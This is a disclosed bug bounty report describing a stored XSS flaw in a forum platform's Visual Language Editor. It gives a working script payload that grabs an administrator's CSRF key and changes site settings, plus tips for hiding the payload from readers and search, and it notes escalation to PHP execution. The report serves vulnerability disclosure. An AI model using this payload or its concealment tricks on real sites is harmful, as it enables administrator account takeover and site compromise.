# XSS with Visual Language Editor tags

## Report Details
- **Report ID**: 2031855
- **URL**: https://hackerone.com/reports/2031855
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-06-19T21:03:38.509Z
- **Disclosed**: 2023-09-17T09:23:00.440Z

## Reporter
- **Username**: mpiosik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ips

## Vulnerability Information
1. Create a post/comment/signature/etc. with the following text: `#VLE#nothing#[<script>ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {'bypassRedirect':true, 'method': 'POST', 'data': {'csrfKey': key, 'site_online_checkbox':1, 'board_name': 'You have been hacked', 'form_submitted': 1}}))</script>]#!##`.
2. Using e.g. the browser's Inspect Element feature, you can surround the text in editor with `<span style='font-size: 0px;'>` and `</span>` to make it invisible for humans.
3. Once the content is posted, visit the page with the content created in step 1. with **Quick Translating** enabled (ACP -> Customization -> Localization -> Languages -> Translations -> Quick Translating, otherwise known as Visual Language Editor or VLE) using an account with administrator privileges.

**Note**: This is not very uncommon, as one could simply suggest an administrator to change wording of a language phrase, or correct a translation in an area where user-generated content (such as comments) is displayed.

4. After visiting the webpage, website name will change to `You have been hacked` (the change can be seen in the browser tab title or in the website's header).

The origin of the vulnerability is **line 254** in `applications/core/dev/js/global/controllers/customization/ips.customization.visualLang.js`. jQuery's `replaceWith` function, which accepts raw HTML, is fed with `.text()` output, which returns unescaped (non-HTML-encoded) text.

(Code from step 1 formatted for readability):
```js
ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(
    ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {
        'bypassRedirect':true,
        'method': 'POST',
        'data': {
            'csrfKey': key,
            'site_online_checkbox':1,
            'board_name': 'You have been hacked',
            'form_submitted': 1
        }
    }
))

## Impact

**The attacker could gain full control of the website and its data, including the ability to execute raw PHP code**. This example shows only a relatively harmless and very simple usage of the vulnerability, but **it can be used to perform any other action on the administrator's behalf**. For instance, attacker could prepare a script to modify a theme template to execute any given PHP code.

Surrounding the VLE code with legitimate text and `<span class="font-size: 0px;">...</span>`makes it invisible for humans, and it could be hidden from built-in search as well by placing it in a signature, for example. The post/signature can then be removed. Without knowing exactly what to look for, the attack origin might never be found.

## Attachments
No attachments
